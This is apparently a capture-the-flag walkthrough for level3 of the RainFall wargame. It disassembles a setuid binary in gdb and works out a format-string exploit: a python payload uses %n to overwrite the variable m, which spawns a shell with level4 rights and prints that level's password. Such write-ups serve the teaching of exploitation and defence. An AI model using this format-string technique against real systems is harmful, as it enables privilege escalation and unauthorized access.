level2@RainFall:~$ su level3
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3

level3@RainFall:~$ ls -l
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3

level3@RainFall:~$ ./level3
aa
aa

********************************************************************************
What we write in the get is returned.
********************************************************************************

level3@RainFall:~$ cat level3
ELF4l	4(44444488888�
c`�     �$(,048S��[�����������t�m��C�[��5�% �%$h������%(������%,h������%0h�����%4h �����%8h(����1�^����PTRh�h0QVh��������������������U��S���=�u?���D��@����9�s��������@��9�r�����[]Ít&��'U����H��t���tBC�$H���ÐU����`�D�D$�������$������������$��������@u4���¸�T$
                   �D$
��������������Ë$Ð���������U��S���8���t�8f����Ћ���u��[]Ð�S��[��3�/����[�Wait what?!D$��� �����9�u߃�[^_]��
/bin/sh;8h���T����x����������������zR�
...

********************************************************************************
We can see two strings in the binary: Wait what?! ; /bin/sh
********************************************************************************

(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048344  _init
0x08048390  printf
0x08048390  printf@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  fwrite
0x080483b0  fwrite@plt
0x080483c0  system
0x080483c0  system@plt
0x080483d0  __gmon_start__
0x080483d0  __gmon_start__@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  v
0x0804851a  main
0x08048530  __libc_csu_init
0x080485a0  __libc_csu_fini
0x080485a2  __i686.get_pc_thunk.bx
0x080485b0  __do_global_ctors_aux
0x080485dc  _fini

********************************************************************************
There's two functions defined, main and v.
********************************************************************************

(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:	push   %ebp
   0x0804851b <+1>:	mov    %esp,%ebp
   0x0804851d <+3>:	and    $0xfffffff0,%esp
   0x08048520 <+6>:	call   0x80484a4 <v>
   0x08048525 <+11>:	leave
   0x08048526 <+12>:	ret
End of assembler dump.

********************************************************************************
The main set the stack and call v.
********************************************************************************

(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:	push   %ebp
   0x080484a5 <+1>:	mov    %esp,%ebp
   0x080484a7 <+3>:	sub    $0x218,%esp
   0x080484ad <+9>:	mov    0x8049860,%eax
   0x080484b2 <+14>:	mov    %eax,0x8(%esp)
   0x080484b6 <+18>:	movl   $0x200,0x4(%esp)
   0x080484be <+26>:	lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:	mov    %eax,(%esp)
   0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:	lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:	mov    %eax,(%esp)
   0x080484d5 <+49>:	call   0x8048390 <printf@plt>
   0x080484da <+54>:	mov    0x804988c,%eax
   0x080484df <+59>:	cmp    $0x40,%eax
   0x080484e2 <+62>:	jne    0x8048518 <v+116>
   0x080484e4 <+64>:	mov    0x8049880,%eax
   0x080484e9 <+69>:	mov    %eax,%edx
   0x080484eb <+71>:	mov    $0x8048600,%eax
   0x080484f0 <+76>:	mov    %edx,0xc(%esp)
   0x080484f4 <+80>:	movl   $0xc,0x8(%esp)
   0x080484fc <+88>:	movl   $0x1,0x4(%esp)
   0x08048504 <+96>:	mov    %eax,(%esp)
   0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:	movl   $0x804860d,(%esp)
   0x08048513 <+111>:	call   0x80483c0 <system@plt>
   0x08048518 <+116>:	leave
   0x08048519 <+117>:	ret
End of assembler dump.

********************************************************************************
We can see that printf write the return of fgets.
At v+59 a cmp is done that check if what is at the address 0x804988c is equal to 64.
If it isn't it leaves the program, else it open a new shell with level4 rights.
********************************************************************************

(gdb) info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
0x0804988c  m

********************************************************************************
We see that at address 0x0804988c we have the variable m.
********************************************************************************

(gdb) run
Starting program: /home/user/level3/level3
AAAA BBBB CCCC DDDD %x %x %x %x %x %x %x %x %x
AAAA BBBB CCCC DDDD 200 b7fd1ac0 b7ff37d0 41414141 42424220 43432042 44204343 20444444 25207825

********************************************************************************
printf isn't protected so we can exploit that and launch a buffer overflow attack with it.
We see by some testing that the buffer of our string is situated on the fourth emplacement on the stack.
We will use the %n option of printf to write in the memory the number returned by printf.
To get 64 in the variable m we will pass the address of the variable m in a string and we will complete 
it to reach 64 characters. Next we will pop 3 items from the stack with 3 %x to push the address of m in
the first position on the stack. To get 64 characters we do: 64 - 4 (addresse de m) - 19 (remplacement des 3 %x = 200b7fd1ac0b7ff37d0) = 41 A to add.
********************************************************************************

level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08"+"A"*41+"%x%x%x%n")' > /tmp/exploit

level3@RainFall:~$ cat /tmp/exploit - | ./level3
�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200b7fd1ac0b7ff37d0
Wait what?!
whoami
level4

cd ../level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa